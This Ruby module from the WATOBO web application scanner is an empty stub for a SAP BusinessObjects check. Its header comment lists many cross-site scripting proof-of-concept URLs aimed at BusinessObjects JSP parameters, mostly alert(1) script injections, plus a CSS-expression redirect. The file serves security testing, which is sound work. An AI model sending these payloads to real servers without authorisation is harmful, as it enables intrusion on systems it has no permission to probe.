# .
# business_objects.rb
# 
# Copyright 2012 by siberas, http://www.siberas.de
# 
# This file is part of WATOBO (Web Application Tool Box)
#        http://watobo.sourceforge.com
# 
# WATOBO is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
# 
# WATOBO is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with WATOBO; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
# .
=begin
http://www.example.com:8080/AdminTools/querybuilder/ie.jsp?ADD_RULE=1&AND_BTN=1&ATTRIBUTES_LIST=1&ATTRIBUTES_NOTES=1&ATTRIBUTES_PROMPT=1&BUILD_SQL_HEADER=1&BUILD_SQL_INSTRUCTION=1&EXIT=1&FINISH=1&FINISH_BTN=1&FINISH_HEADER=1&IETIPS=1&MUST_ANDOR_CLAUSES=1&MUST_SELECT_CLAUSES=1&NO_CLAUSES=1&NO_RULES=1&OR=1&OR_BTN=1&OTHER_RULE_HEADER=1&REMOVE=1&REMOVE_RULE_HEADER=1&RESET=1&RULE_HEADER=1&SELECT_SUBTITLE1=mr&SELECT_SUBTITLE2=mr&SELECT_SUBTITLE3=mr&SELECT_SUBTITLE4=mr&SPECIFY_ATTRIBUTES_PROMPT=1&SUBMIT=1&TITLE=mr&WELCOME_USER=1&framework=%22%3E%3Cscript%3Ealert(1)%3C/script%3E
http://www.example.com:8080/AdminTools/querybuilder/logonform.jsp?APSNAME=Procheckup&AUTHENTICATION=1&LOGON=1&LOG_ON=1&NOTRECOGNIZED=1&PASSWORD=Pcu12U4&REENTER=1&TITLE=mr&UNSURE=1&USERNAME=Procheckup&WELCOME_LOGON=1&action=1&framework="><script>alert(1)</script>
http://www.example.com:8080/AnalyticalReporting/querywizard/jsp/apply.jsp?WOMdoc=1&WOMqueryAtt=1&WOMquerycontexts=1&WOMqueryfilters=1&WOMqueryobjs=1&WOMunit=1&bodySel=1&capSel=1&colSel=1&compactSteps=1&currReportIdx=1&defaultName=Procheckup&docid=1&doctoken=1&dummy=1&isModified=1&lang="></script><script>alert(1)</script>&lastFormatZone=1&lastOptionZone=1&lastStepIndex=1&mode=1&rowSel=1&sectionSel=1&skin=1&topURL=1&unvid=1&viewType=1&xSel=1&ySel=1&zSel=1&
http://www.example.com:6405/AnalyticalReporting/querywizard/jsp/apply.jsp?lang=%22%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E&
http://www.example.com:8080/AnalyticalReporting/querywizard/jsp/query.jsp?contexts=1&docid=1&doctoken=1&dummy=1&lang="></script><script>alert(1)</script>
http://www.example.com:6405/AnalyticalReporting/querywizard/jsp/query.jsp?lang="></script><script>alert(1)</script>
http://www.example.com:8080/AnalyticalReporting/querywizard/jsp/query.jsp?contexts=1&docid=1&doctoken=1&dummy=1&lang=1&mode=1&queryobjs=1&resetcontexts=1&scope=1&skin="></script><script>alert(1)</script>&unvid=1&
http://www.example.com:6405/AnalyticalReporting/querywizard/jsp/query.jsp?skin="></script><script>alert(1)</script>
http://www.example.com:8080/AnalyticalReporting/querywizard/jsp/turnto.jsp?WOMblock=1&WOMqueryAtt=1&WOMqueryfilters=1&WOMqueryobjs=1&WOMturnTo=1&WOMunit=1&doctoken=1&dummy=1&lang="></script><script>alert(1)</script>&skin=1&unit=1&
http://www.example.com:6405/AnalyticalReporting/querywizard/jsp/turnto.jsp?lang="></script><script>alert(1)</script>
http://www.example.com:8080/CrystalReports/jsp/CrystalReport_View/viewReport.jsp?loc=//-->"></script><script>alert(1)</script>
http://www.example.com:8080/InfoViewApp/jsp/common/actionNavFrame.jsp?url="></script><script>alert(1)</script>
http://www.example.com:8080/PerformanceManagement/scripts/docLoadUrl.jsp?url=%22%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E
http://www.example.com:6405/PerformanceManagement/scripts/docLoadUrl.jsp?url=�></script><script>alert(1)</script>
http://www.example.com:8080/PerformanceManagement/jsp/aa-display-flash.jsp?swf="><html><body><script>alert(1)</script>
http://www.example.com:8080/PerformanceManagement/jsp/alertcontrol.jsp?serSes=%22%3E%3Cscript%3Ealert(1)%3C/script%3E
http://www.example.com:6405/PerformanceManagement/jsp/alertcontrol.jsp?serSes=�><script>alert(1)</script>
http://www.example.com:8080/PerformanceManagement/jsp/viewError.jsp?error=<script>alert(1)</script>
http://www.example.com:6405/PerformanceManagement/jsp/viewError.jsp?error=<script>alert(1)</script>
http://www.example.com:8080/PerformanceManagement/jsp/ic_pm/wigoalleftlisttr.jsp?actcontent=1&actiontype=1&actual=1&anlimage=1&columns=1&flowid="<~/XSS/*-*/STYLE=xss:e/**/xpression (location='http://www.procheckup.com')>&flowname=Procheckup&gacid=1&list=1&listname=Procheckup&listonly=1&progstatus=1&progtrend=1&progtrendImage=1&target=http://www.procheckup.com&uid=1&variance=1&viewed=1&
http://www.example.com:6405/PerformanceManagement/jsp/ic_pm/wigoalleftlisttr.jsp?flowid=%22%3E%3Cscript%3Ealert(1)%3C/script%3E&flowname=Procheckup&progtrend=1&viewed=1&
http://www.example.com:8080/PerformanceManagement/jsp/ic_pm/wigoalleftlisttr.jsp?actcontent=1&actiontype=1&actual=1&anlimage=1&columns=1&flowid="><script>alert(1)</script>&flowname=Procheckup&gacid=1&list=1&listname=Procheckup&listonly=1&progstatus=1&progtrend=1&progtrendImage=1&target=1&uid=1&variance=1&viewed=1&
http://www.example.com:6405//PerformanceManagement/jsp/ic_pm/wigoalleftlisttr.jsp?&flowid="><script>alert(1)</script>&flowname=Procheckup&gacid=1&progtrend=1&progtrendImage=1&viewed=1&
http://www.example.com:8080/PerformanceManagement/jsp/sb/roleframe.jsp?rid="<~/XSS/*-*/STYLE=xss:e/**/xpression(location='http://www.procheckup.com')>
http://www.example.com:6405//PerformanceManagement/jsp/sb/roleframe.jsp?rid="<~/XSS/*-
http://www.example.com:8080/PerformanceManagement/jsp/viewWebiReportHeader.jsp?sEntry=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E
http://www.example.com:6405/PerformanceManagement/jsp/viewWebiReportHeader.jsp?sEntry=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E
http://www.example.com:8080/PerformanceManagement/jsp/wait-frameset.jsp?dummyParam="</script><script>alert(1)</script>
http://www.example.com:6405/PerformanceManagement/jsp/wait-frameset.jsp?dummyParam="</script><script>alert(1)</script>
http://www.example.com:8080/PlatformServices/preferences.do?cafWebSesInit=true&service=<SCRIPT>alert(1)</SCRIPT>&actId=541&appKind=CMC  
=end


module Watobo
  module Modules
    module Active
      module Sap
        
        
        class Business_objects < Watobo::ActiveCheck
          
          def initialize(project, prefs={})
           
            super(project, prefs)
          end
        end
        
end
end
end
end